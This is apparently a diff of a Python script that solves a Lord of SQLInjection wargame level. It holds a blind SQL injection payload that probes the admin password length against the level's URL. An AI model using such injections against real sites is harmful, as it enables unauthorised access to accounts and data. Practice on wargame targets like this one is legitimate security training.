@@ -1,11 +1,11 @@
 #-*- coding: utf-8 -*-
-import string, sys
+import string
 from web import *
 
 url = "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw={}"
 
 # get length
-length = 40
+length = 0
 inject_url = "' or id='admin' and length(pw)='{}"
 
 for i in range(100):
